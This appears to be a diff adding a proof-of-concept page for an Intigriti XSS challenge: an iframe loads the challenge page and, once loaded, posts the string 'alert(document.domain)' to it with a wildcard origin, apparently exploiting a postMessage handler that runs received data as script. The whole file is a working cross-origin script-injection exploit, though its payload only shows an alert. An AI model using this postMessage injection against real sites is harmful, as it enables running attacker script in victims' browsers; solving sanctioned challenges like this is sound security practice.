@@ -1,0 +1,10 @@
+<body>
+<iframe id='target'></iframe>
+<script>
+var target = document.getElementById('target');
+target.addEventListener('load',()=>{
+target.contentWindow.postMessage("alert(document.domain)",'*');
+});
+target.src='http://challenge-june.intigriti.io/challenges/june.html'
+</script>
+</body>
